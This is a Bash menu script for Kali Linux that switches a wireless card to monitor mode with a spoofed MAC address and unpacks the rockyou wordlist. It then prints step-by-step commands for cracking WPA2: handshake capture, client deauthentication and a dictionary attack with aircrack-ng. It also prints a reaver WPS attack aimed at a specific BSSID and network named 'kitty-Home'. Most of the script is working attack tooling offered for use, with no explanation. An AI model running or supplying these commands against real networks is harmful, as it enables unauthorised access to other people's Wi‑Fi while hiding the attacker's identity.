#!/bin/bash
# CBB Kali Config Bash Menu Script
#vi filename
#:set ff=unix
#:wq
title="CBB Kali Config"
echo "-------------------------------------------------------------------------------";
echo "-_____-______-______---_---__--------_--_---_____-----------------__--_--------";
echo "/--__-\|-___-\|-___-\-|-|-/-/-------|-|(_)-/--__-\---------------/-_|(_)-------";
echo "|-/--\/|-|_/-/|-|_/-/-|-|/-/---__-_-|-|-_--|-/--\/--___---_-__--|-|_--_---__-_-";
echo "|-|----|-___-\|-___-\-|----\--/-_\`-||-||-|-|-|-----/-_-\-|-'_-\-|--_||-|-/-_\`-|";
echo "|-\__/\|-|_/-/|-|_/-/-|-|\--\|-(_|-||-||-|-|-\__/\|-(_)-||-|-|-||-|--|-||-(_|-|";
echo "-\____/\____/-\____/--\_|-\_/-\__,_||_||_|--\____/-\___/-|_|-|_||_|--|_|-\__,-|";
echo "--------------------------------------------------------------------------__/-|";
echo "-------------------------------------------------------------------------|___/-";
echo "-------------------------------------------------------------------------------";
echo " ";
echo "Written by Navix";
echo "Version 1.0 30OCT2017";
echo " ";
read -p "Configuring wlan0 or wlan1?:  " nic
echo "$nic selected..."
echo " ";
echo "Unzipping rockyou.txt and copying to the desktop..."
gunzip /usr/share/wordlists/rockyou.txt.gz
cp /usr/share/wordlists/rockyou.txt /root/Desktop

PS3='What would you like to do?: '
options=("NIC Monitor Mode w/ MAC Change" "NIC Original Mode" "Show WPA2 Crack Commands" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "NIC Monitor Mode w/ MAC Change")
		echo "---------------------------------------------------------------"
        	echo "Configuring $nic to monitor mode..."
		ifconfig $nic down
		echo "ifconfig $nic down..."
		macchanger -r $nic
		echo "macchanger -r $nic..."
		iwconfig $nic mode monitor
		echo "iwconfig $nic mode monitor..."
		ifconfig $nic up
		echo "ifconfig $nic up..."
		airmon-ng  kill
		echo "airmon-ng check kill..."
		echo "---------------------------------------------------------------"
		echo " "
		echo "1) $nic: Monitor Mode w/ MAC Change"
		echo "2) $nic: Original Mode"
		echo "3) Show WPA2 Crack Commands"
		echo "4) Quit"
            ;;
        "NIC Original Mode")
		echo "---------------------------------------------------------------"
          	ifconfig $nic down
		echo "ifconfig $nic down..."
		iwconfig $nic mode managed
		echo "ifconfig $nic mode managed..."
		ifconfig $nic up
		echo "ifconfig $nic up..."
		service NetworkManager start
		echo "service NetworkManager started..."
		echo "---------------------------------------------------------------"
		echo " "
		echo "1) $nic: Monitor Mode w/ MAC Change"
		echo "2) $nic: Original Mode"
		echo "3) Show WPA2 Crack Commands"
		echo "4) Quit"
            ;;
        "Show WPA2 Crack Commands")
          	echo "---------------------------------------------------------------"
		echo "--------------------WPA2 Brute Force---------------------------"
          	echo "---------------------------------------------------------------"
		echo "airodump-ng $nic"
		echo "#get CH# and BSSID"
		echo "airodump-ng -c *12* --bssid *BBSID#* -w /tmp/test $nic"
		echo "#Terminal 2"
		echo "aireplay-ng -0 0 -a *BBSID#* -c *any STATION#*" $nic
		echo "*check other window for WPA handshake*"
		echo "#stop aireplay-ng"
		echo "#Terminal 2"
		echo "clear"
		echo "cd /tmp/"
		echo "aircrack-ng /tmp/test-01.cap -w *path to dictionary file.txt*"
		echo "#Checks for password within dictionary"
		echo " "
          	echo "---------------------------------------------------------------"
		echo "--------------------------WPS Crack----------------------------"
          	echo "---------------------------------------------------------------"
		echo "aireplay-ng wlan0mon -1 10 -a 68:7F:74:E2:4A:1C -e kitty-Home"
		echo "reaver -i wlan0mon -A -b 68:7F:74:E2:4A:1C -c 6 -vv --no-nacks --win7"
		echo " "
		echo "---------------------------------------------------------------"
		echo " "
		echo "1) $nic: Monitor Mode w/ MAC Change"
		echo "2) $nic: Original Mode"
		echo "3) Show WPA2 Crack Commands"
		echo "4) Quit"
            ;;
        "Quit")
		echo "---------------------------------------------------------------"
		echo "---------------------------EXITING-----------------------------"
		echo "---------------------------------------------------------------"
            break
            ;;
        *) echo sorry invalid option;;
    esac
done
